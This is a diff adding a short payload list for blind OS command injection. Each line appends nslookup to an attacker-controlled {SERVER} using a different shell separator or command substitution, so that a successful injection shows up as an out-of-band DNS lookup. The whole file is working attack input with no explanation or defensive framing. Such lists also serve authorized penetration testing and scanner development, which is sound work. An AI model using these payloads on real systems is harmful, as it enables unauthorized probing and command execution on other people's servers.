@@ -1,0 +1,9 @@
+//CHANGE {SERVER} TO SERVER YOU CONTROL
+|| nslookup {SERVER}
+| nslookup {SERVER}
+; nslookup {SERVER}
+; nslookup {SERVER};
+&& nslookup {SERVER}
+& nslookup {SERVER}
+`nslookup {SERVER}`
+$(nslookup {SERVER})
